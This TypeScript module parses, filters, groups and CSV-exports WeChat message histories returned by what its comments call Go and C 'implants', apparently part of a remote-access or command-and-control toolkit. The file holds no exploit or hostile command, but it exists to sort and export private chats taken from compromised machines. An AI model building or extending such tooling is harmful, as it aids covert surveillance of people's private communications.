export interface WeChatMessage {
  time: string;
  sender: string;
  contact: string;
  contactId: string;
  kind: string;
  content: string;
}

export type WeChatSenderFilter = "all" | "me" | "other";
export type WeChatSortDirection = "desc" | "asc";

export interface WeChatConversation {
  id: string;
  contact: string;
  contactId: string;
  count: number;
  latest: string;
}

export interface WeChatHistoryMeta {
  messages: WeChatMessage[];
  /** JSON-looking lines that could not be turned into messages. */
  skipped: number;
  /** True when the implant reports that no WeChat data directory was found. */
  hasNoSource: boolean;
  /** Per-database query errors reported by the implant. */
  queryErrors: string[];
}

function asText(value: unknown): string {
  if (typeof value === "string") return value;
  if (typeof value === "number" && Number.isFinite(value)) return String(value);
  return "";
}

const MESSAGE_KEYS = ["time", "contact", "contact_id", "content", "type", "sender"] as const;

/**
 * Parses the agent's wechat_history JSON Lines output. Go and C implants emit
 * one JSON object per line, surrounded by header/trailer noise such as
 * `=== wechat history ===`, `(no matching messages found)` and `# total_rows=N`.
 * Malformed lines are skipped so one bad message cannot break the whole list.
 */
export function parseWeChatHistoryWithMeta(result: string): WeChatHistoryMeta {
  const messages: WeChatMessage[] = [];
  const queryErrors: string[] = [];
  let skipped = 0;
  let hasNoSource = false;
  if (!result) return { messages, skipped, hasNoSource, queryErrors };

  for (const raw of result.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line) continue;
    if (line === "(WeChat data directory not found or not on Windows)") {
      hasNoSource = true;
      continue;
    }
    if (line.startsWith("query error:")) {
      queryErrors.push(line.replace(/^query error:\s*/, ""));
      continue;
    }
    if (!line.startsWith("{")) continue;
    let parsed: unknown;
    try {
      parsed = JSON.parse(line) as unknown;
    } catch {
      skipped += 1;
      continue;
    }
    if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
      skipped += 1;
      continue;
    }
    const value = parsed as Record<string, unknown>;
    if (!MESSAGE_KEYS.some((key) => value[key] !== undefined)) continue;
    const time = asText(value.time).trim();
    const contact = asText(value.contact).trim();
    const contactId = asText(value.contact_id).trim();
    if (!time || (!contact && !contactId)) {
      skipped += 1;
      continue;
    }

    messages.push({
      time,
      sender: asText(value.sender).trim() || "other",
      contact: contact || contactId,
      contactId,
      kind: asText(value.type).trim(),
      content: asText(value.content),
    });
  }

  return { messages, skipped, hasNoSource, queryErrors };
}

export function parseWeChatHistory(result: string): WeChatMessage[] {
  return parseWeChatHistoryWithMeta(result).messages;
}

function timeValue(time: string): number {
  const value = Date.parse(time);
  return Number.isNaN(value) ? Number.NEGATIVE_INFINITY : value;
}

export function filterWeChatMessages(
  messages: WeChatMessage[],
  query: string,
  sender: WeChatSenderFilter = "all",
): WeChatMessage[] {
  const q = query.trim().toLowerCase();
  return messages.filter((message) => {
    if (sender !== "all" && message.sender.toLowerCase() !== sender) return false;
    if (!q) return true;
    return (
      message.contact.toLowerCase().includes(q) ||
      message.contactId.toLowerCase().includes(q) ||
      message.content.toLowerCase().includes(q) ||
      message.sender.toLowerCase().includes(q)
    );
  });
}

export function sortWeChatMessages(
  messages: WeChatMessage[],
  direction: WeChatSortDirection = "desc",
): WeChatMessage[] {
  return [...messages].sort((a, b) => {
    const diff = timeValue(b.time) - timeValue(a.time);
    if (diff !== 0) return direction === "desc" ? diff : -diff;
    return a.contact.localeCompare(b.contact);
  });
}

export function groupWeChatConversations(messages: WeChatMessage[]): WeChatConversation[] {
  const groups = new Map<string, WeChatConversation>();
  for (const message of messages) {
    const id = message.contactId || message.contact;
    const existing = groups.get(id);
    if (!existing) {
      groups.set(id, {
        id,
        contact: message.contact,
        contactId: message.contactId,
        count: 1,
        latest: message.time,
      });
      continue;
    }
    existing.count += 1;
    if (timeValue(message.time) >= timeValue(existing.latest)) {
      existing.latest = message.time;
      existing.contact = message.contact;
      existing.contactId = message.contactId;
    }
  }
  return [...groups.values()].sort((a, b) => {
    const diff = timeValue(b.latest) - timeValue(a.latest);
    if (diff !== 0) return diff;
    return a.contact.localeCompare(b.contact);
  });
}

function escapeCSV(value: string): string {
  return /[",\n\r]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

export function toWeChatCSV(messages: WeChatMessage[]): string {
  const rows = ["Time,Sender,Contact,Contact ID,Type,Content"];
  for (const message of messages) {
    rows.push(
      [
        escapeCSV(message.time),
        escapeCSV(message.sender),
        escapeCSV(message.contact),
        escapeCSV(message.contactId),
        escapeCSV(message.kind),
        escapeCSV(message.content),
      ].join(","),
    );
  }
  return `${rows.join("\n")}\n`;
}
